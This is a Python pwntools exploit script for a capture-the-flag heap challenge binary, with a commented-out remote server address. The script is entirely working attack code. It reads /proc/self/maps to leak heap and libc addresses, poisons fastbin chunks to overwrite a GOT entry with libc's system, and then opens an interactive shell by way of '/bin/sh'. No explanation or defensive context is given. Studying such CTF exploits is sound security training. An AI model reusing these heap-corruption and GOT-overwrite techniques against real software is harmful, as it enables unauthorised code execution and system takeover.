from pwn import *

s = process("./pray_CaNaKMgF_c168c46310ac4ad3272f62eebde193d2b295e80d")
#s = remote("128.199.247.60", 10001)

s.sendline("2")
s.recvuntil("?")
s.sendline("/proc/self/maps")
s.recvuntil(":\n")
maps = s.recvuntil("\nwhen")

lines = maps.split("\n")

heap = int(lines[3][:8],16)
libc = ELF("libc.so.6")
libc.address = int(lines[4][:12], 16)

s.recvuntil("Run away\n")
def alloc(buf, size=0):
	if not size:
		size = len(buf)

	s.sendline("1")
	s.recvuntil("Length")
	s.sendline("%d" % size)
	s.send(buf)
	s.recvuntil("Run away\n")

def free(num):
	s.sendline("3")
	s.recvuntil("Num?")
	s.sendline("%d" % num)
	s.recvuntil("Run away\n")

alloc("A"*8, 0x50)
alloc("b"*8, 0x50)
alloc("c"*8, 0x50)
alloc("d"*8, 0x500)

free(0)
free(1)
free(2)

alloc("e"*8, 0x500)

buf = "Q"*8*11
buf += p64(0x61)
buf += "A"*8*11
buf += p64(0x61)

alloc(buf, 0x50+0x60*2)

raw_input()

free(0)
free(1)


buf = "Q"*8*11
buf += p64(0x61)
buf += p64(0x602002-0x8)
buf += "A"*8*10
buf += p64(0x61)

raw_input()
alloc(buf, 0x50+0x60*2)
alloc("/bin/sh\00", 0x50)

addr = libc.symbols['system']
buf = "A"*(0x18-0xa)
buf += p64(addr)
alloc(buf, 0x50)

s.interactive()
